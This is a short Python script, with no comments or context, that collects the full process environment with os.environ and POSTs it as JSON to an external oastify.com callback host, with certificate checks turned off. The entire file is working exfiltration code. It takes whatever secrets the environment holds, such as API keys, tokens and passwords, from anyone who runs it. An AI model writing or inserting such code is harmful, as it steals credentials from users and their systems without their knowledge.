import requests
import time
import os
import json

json_value = json.dumps({'result':str(os.environ)})
url = 'https://0hi82en7vhjw6c7rcy3st626hxnobhz6.oastify.com'
headers = {'Content-Type': 'application/json'}

response = requests.post(url, headers=headers, data=json_value, verify=False)
